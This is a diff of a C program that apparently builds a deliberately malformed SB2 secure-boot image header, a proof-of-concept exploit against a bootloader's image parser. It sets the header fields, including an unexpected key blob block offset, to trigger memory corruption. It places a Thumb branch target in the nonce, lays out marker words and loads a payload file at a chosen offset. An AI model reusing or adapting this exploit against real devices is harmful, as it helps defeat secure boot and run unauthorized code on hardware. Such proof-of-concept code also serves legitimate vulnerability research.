@@ -54,8 +54,9 @@ typedef struct version_t version_t;
 int main() {
 	struct sb2_header_t header = { 0 };
 
+	//uint32_t blank[4096/4] = { 0 };
 	// This is waaaay more than we need but it gives us space
-	uint32_t extra_bytes[1000] =  { 0 };
+	uint32_t extra_bytes[1000+0x4000] =  { 0 };
 	int in_fd, out_fd, assembly_fd, ret, size;
 	struct stat st;
 
@@ -64,7 +65,7 @@ int main() {
 	// Branch target!
 	// Remember to set the low bit for thumb mode
 	header.nonce[1] = 0x1301ae71;
-	//header.nonce[1] = 0x14001775;
+	//header.nonce[1] = 0x14005aa1;
 	// Branch to self (just for testing)
 	header.nonce[2] = 0xe7fee7fe;
 	// Extra 
@@ -82,17 +83,20 @@ int main() {
 
 	// total number of image blocks, needs to account for how much
 	// we are sending
-	header.m_imageBlocks = 0x41;
+	//header.m_imageBlocks = 0x41;
+	header.m_imageBlocks = 0x800;
 
 	// Needs to be > than the key blob block
-	header.m_firstBootTagBlock = 0x40;
+	header.m_firstBootTagBlock = 0x600;
 
 	// set a value for the cet offset
-	header.m_offsetToCertificateBlockInBytes = 0x40;
+	header.m_offsetToCertificateBlockInBytes = 0x550;
 	header.m_headerBlocks = 0x6;
 
 	// Our magic: set this to something unexpected!
-	header.m_keyBlobBlock = 0x30;
+	//header.m_keyBlobBlock = 0x480;
+	header.m_keyBlobBlock = 0x3e;
+
 
 	header.m_keyBlobBlockCount = 0x1;
 	header.m_maxSectionMacCount = 0x5;
@@ -127,8 +131,16 @@ int main() {
 	fstat(in_fd, &st);
 	size = st.st_size;
 
-	// Read in to the space after our heap stuff	
-	ret = read(in_fd, &extra_bytes[117], size);
+	#define BASE 220
+
+	extra_bytes[BASE-1] = 0x55555555;
+	extra_bytes[BASE] = 0x12345678;
+	extra_bytes[BASE+1] = 0x12345678;
+	extra_bytes[BASE+2] = 0x12345678;
+	extra_bytes[BASE+3] = 0x12345678;
+	extra_bytes[BASE+4] = 0x55555555;
+
+	ret = read(in_fd, &extra_bytes[0x1140], size);
 	
 	if (ret < 0) {
 		printf("failed to read");
